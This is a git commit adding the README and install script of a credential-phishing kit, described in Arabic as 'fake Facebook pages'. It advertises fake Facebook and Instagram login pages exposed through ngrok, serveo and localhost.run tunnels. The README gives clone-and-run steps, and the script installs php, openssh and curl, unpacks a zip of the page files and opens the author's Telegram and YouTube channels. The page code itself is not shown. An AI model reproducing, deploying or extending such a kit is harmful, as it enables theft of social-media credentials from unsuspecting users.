8c7283b15c0da632813d62a5ed6be994244fc675
ELQNAS DAYMON <110784685+elqnas-daymon-x1@users.noreply.github.com>
2022-08-17 00:21:32 +0200

    Add files via upload

--- README.md
+++ README.md
@@ -1,2 +1,66 @@
-# demon
-صفحات مزوره فيسبوك
+
+
+
+
+# 
+# 
+## Installation Commands ↙️
+  
+apt update 
+
+
+apt upgrade 
+
+apt install bash
+
+
+
+git clone https://github.com/elqnas-daymon-x1/demon.git
+
+
+cd D-Phishing
+
+ls
+
+
+chmod +x *
+
+
+
+bash install.sh
+
+
+bash demon.sh
+
+
+
+
+
+
+# ##
+### <<< If you copy , Then Give me The Credits >>>
+
+## Features :
+#### [+] Latest Login Pages !
+#### [+] New Instagram Auto Follower Page !
+#### [+] 4 Port Forwarding Options !
+#### [+] Easy for Beginners !
+#### [+] Facebook login page 
+## Tunelling Options :
+#### > Localhost (127.0.0.1)
+#### > NGROK (https://ngrok.com)
+#### > SERVEO (https://serveo.net)
+#### > LOCALHOSTRUN (https://localhost.run)
+ 
+
+
+
+follow me 
+##   https://t.me/Daymon_Hack
+
+##   https://youtube.com/c/ELQNASDAYMON
+
+
+
+
+
---
+++ install.sh
@@ -0,0 +1,65 @@
+#!/bin/bash
+#code_recorded_by_tech_cochi
+clear
+sleep 1
+echo ""
+echo ""
+echo " 
+████████╗███████╗░█████╗░██╗░░██╗
+╚══██╔══╝██╔════╝██╔══██╗██║░░██║
+░░░██║░░░█████╗░░██║░░╚═╝███████║
+░░░██║░░░██╔══╝░░██║░░██╗██╔══██║
+░░░██║░░░███████╗╚█████╔╝██║░░██║
+░░░╚═╝░░░╚══════╝░╚════╝░╚═╝░░╚═╝ " | lolcat
+
+
+
+
+echo ""
+sleep 1
+clear
+
+pkg install php -y
+pkg install openssh -y
+pkg install unzip -y
+pkg install curl -y
+sleep 1
+clear
+
+echo "Loading==> " | lolcat
+sleep 1
+clear
+echo "Loading====> " | lolcat
+sleep 1
+clear
+echo "Loading=======> " | lolcat
+sleep 1
+clear
+echo " done " | lolcat
+sleep 1
+clear
+unzip techcochi.zip
+clear
+rm -rf techcochi.zip
+clear
+bash about.sh
+sleep 4
+echo ""
+echo ""
+echo " SUBSCRIBE MY CHANNEL 🔔 " | lolcat
+xdg-open https://t.me/Daymon_Hack
+echo ""
+sleep 10
+echo " create account on c "
+echo " set your browser "
+
+
+clear
+
+
+   printf "\n"
+   printf "\e[1;93m bash demon.sh\e[0m \n"
+   printf "\n"
+
+termux-open-url https://youtube.com/c/ELQNASDAYMON
+echo ""
